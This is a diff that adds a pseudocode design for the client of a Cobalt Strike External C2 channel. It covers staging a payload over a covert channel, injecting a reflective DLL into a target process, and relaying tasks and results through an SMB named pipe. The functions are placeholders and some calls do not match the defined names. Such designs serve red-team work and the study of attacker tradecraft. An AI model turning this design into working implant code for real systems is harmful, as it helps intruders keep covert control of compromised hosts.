@@ -1,0 +1,243 @@
+#Pseudocode for external_c2 spec
+
+# External_c2 = the cobalt strike teamserver
+
+# c2_client = the client process running on the host
+
+# c2_server = the third party server that interfaces with everything
+
+class commonUtils:
+# This class is for common utilities used throughout the program
+#
+# I opted for a going generic as possible on the task retrieveal, and sending of metadata as possible, 
+#  so that it can be used for both parts, the staging of the payload, and during payload runtime. 
+# However, for we should probably opt for handling those separately, 
+#  so that different encoding/encryption schemes can be applied to data related to the stage, and data related to the running payload
+
+	def retrieveData():
+		# Basically, depends on your covert channel, but do whatever you need to do here to retrieve the next bit of data, and return that (decoded) data
+
+		encoded_task = download(task_destination)
+
+		decoded_data = self.decodeData(encoded_task)
+
+		if decoded_data != Null:
+			return decoded_data
+		else: 
+		# Probably do some error handling here instead of just returning Null
+			return None
+
+	def sendData(data):
+		# Uploads the given data to your covert channel. Prepare the data, then send it.
+		#
+		# Return 0 on success
+		# Now upload the already prepared data via covert channel.
+		upload_status = upload(data)
+
+		# if successful, return 0
+		if upload_status == 0:
+			return 0
+		else:
+			# Proper error checking would probably go here
+			return None
+
+	def prepData(data):
+		# This will prepare whatever data is given. Typically, this will mean that encoding and encryption will be done here
+		# returns the processed data 
+		encode_data = encodingScheme(data)
+		encrypted_data = encryptionScheme(encode_data)
+
+		return encrypted_data
+
+	def decodeData(data):
+		# This will attempt to decode whatever data is given to it. Typically, this will pretty much be the reverse of commonUtils.prepData()
+		# returns the data in plain form
+		decrypted_data = decryptionScheme(data)
+		decoded_data = decodingScheme(decrypted_data)
+
+		return decoded_data
+
+	def writeToPipe(str(pipename), data):
+		# This will send the given data to given pipename
+		# data should be already decoded
+		# If we get an error writing to the pipe, we need to consider this beacon killed
+
+		# Prepare the pipename variable
+		pipename = "\\.\pipe\" + pipename
+
+		# Basically, this would be whatever stuff is needed to write to the SMB pipe, and send the data to it
+		# return 0 if it worked
+		pipe_status = sendDataToPipe(pipename, data)
+
+		# if successful, return 0, else do some error handling
+		if pipe_status == 0:
+			return 0
+		else:
+			# Notify
+			self.notifyKill() # we had an issue writing to the pipe, assume beacon is dead
+
+	def readFromPipe(str(pipename)):
+		# This will read data from given pipename
+
+		# Prepare the pipename variable
+		pipename = "\\.\pipe\" + pipename
+
+		# Basically, this would be whatever stuff is needed to read from the SMB pipe
+		# returns the data read from the pipe if it worked, else return Null
+		pipe_data = readDataFromPipe(pipename)
+
+		if pipe_data:
+			return pipe_data
+		else:
+			self.notifyKill() # we had an issue reading from the pipe, assume beacon is dead
+
+
+	def notifyKill():
+		# Notify the c2_controller that our beacon has died
+		# We can have a constant value set as the notification that we're dead
+		# We'll use the string "Well... shit" for illustration
+		# We'll start with preparing the signal
+		kill_signal = commonUtils.prepData("Well... shit")
+
+		# Send the kill signal via the covert channel
+		self.sendData(kill_signal)
+
+		# Kill yourself
+		sys.exit(0)
+
+
+class stagerSession:
+# This class is used to handle the whole staging process
+	def injectStage(payload):
+		# Inject the payload stage, a Reflective DLL with patched self-bootstraping header into the target process
+		# Target process will probably be a constant, else, we can do whatever logic we want here
+
+		allocateStagingProcessing(TARGET_PROC) # Prepare TARGET_PROC for the injection
+		
+		# Load the stager into TARGET_PROC and return the handle
+		session_handle = loadStagerDLL(TARGET_PROC, payload)
+
+		pipeData = None
+		while pipeData is None:
+			# C2_PIPE_NAME is the pipe name constant we'll be using for this
+			pipeCheck = commonUtils.readFromPipe(C2_PIPE_NAME)
+
+			# Sleep for x amount of time, if we didn't get anything. We should/will probably have this as a configurable constant. 
+			if pipeCheck == None:
+				sleep(5) #restart the loop
+			else: 
+				# Our data is already decoded, end the loop by assigning it to recvdData.
+				pipeData = pipeCheck
+
+		return pipeData
+
+
+	def requestSession():
+		# Here we prepare a signal known to the c2 controller and the c2 client that we are ready to begin the staging process.
+		# The signal we'll use here is the following string: "My code is my password. Verify me."
+		# Could probably have something that makes this signal either TOTP or random in some way
+
+		stager_signal = commonUtils.prepData("My code is my password. Verify me.")
+
+		# Send data via the covert channel
+		commonUtils.sendData(stager_signal)
+
+		# So basically, this section of the function defines the payload retrieval process
+		# Loop until you retrieve data via the covert channel
+		recvdData = None
+		while recvdData is None:
+			dataCheck = commonUtils.retrieveData()
+
+			# Sleep for x amount of time, if we didn't get anything. We should/will probably have this as a configurable constant. 
+			if dataCheck == None:
+				sleep(5) #restart the loop
+			else: 
+				# Our data is already decoded, end the loop by assigning it to recvdData.
+				recvdData = dataCheck
+
+		payload = recvdData
+		return payload
+
+
+		
+	# Relays metadata from the SMB beacon to the c2 controller
+	def relayMetaData():
+		# Start with reading the metadata from the SMB beacon
+		beacon_metadata = commonUtils.readFromPipe(C2_PIPE_NAME)
+
+		# Prepare the beacon_metadata to be sent to the controller
+		prep_beacon_metadata = commonUtils.prepData(beacon_metadata)
+
+		# Relay this metadata to the c2 controller
+		commonUtils.sendData(prep_beacon_metadata)
+
+	# The main method for the staging process
+	def main():
+		# Requests the session and retrieves the payload
+		payload = self.requestSession()
+
+		# inject the payload stager, retrieve data from the now established named pipe connectoin
+		metadata = self.injectStage(payload)
+
+		# metadata is the metadata retrieved from the named pipe connection
+		# We need to send this metadata to the controller
+
+		# Start with preparing the metadata to be sent
+		prep_metadata = commonUtils.prepareData(metadata)
+
+		# Send this data via the covert channel
+		relayCheck = commonUtils.sendData(prep_metadata)
+
+		# relayCheck should be 0 if everything went right
+		return relayCheck 
+
+
+class establishedSession:
+# This class is used to handle an already running session
+
+	# Attempts to look for new tasks via the covert channel
+	def checkForTasks():
+		recvdTask = None
+		while recvdTask is None:
+			taskCheck = commonUtils.retrieveData()
+
+			if taskCheck == None:
+				# Sleep for x amount of time, if we didn't get anything. We should/will probably have this as a configurable constant. 
+				# Restarts the loop
+				sleep(5) 
+			else: 
+				# Our data is already decoded, end the loop by assigning it to recvdTask.
+				recvdTask = taskCheck
+
+		return recvdTask
+		
+
+# Main loop for the client
+def main(pipe_connection):
+
+	# Lets get everything started with the stager
+	stager_status = stagerSession.main()
+
+	if stager_status != 0:
+		# Something went wrong with the staging process, kill yoself
+		sys.exit(1)
+
+	while True:
+		newTask = establishedSession.checkForTasks() #loop until we have a new task
+
+		# once we have a new task, lets relay that to the beacon
+		# returns 0 if everything is gucci
+		sendTask = commonUtils.writeToPipe(C2_PIPE_NAME, newTask)
+
+		# can have error handling here for send task
+
+		# The beacon will process the task and write a response to the named pipe
+		taskResponse = commonUtils.readFromPipe(C2_PIPE_NAME)
+
+		# Let's prepare the data to be sent to the controller
+		prep_taskResponse = commonUtils.prepData(taskResponse)
+
+		# Send it to the controller
+		sendData(prep_taskResponse)
+
+		# restart this loop until notifyKill() ends up being called
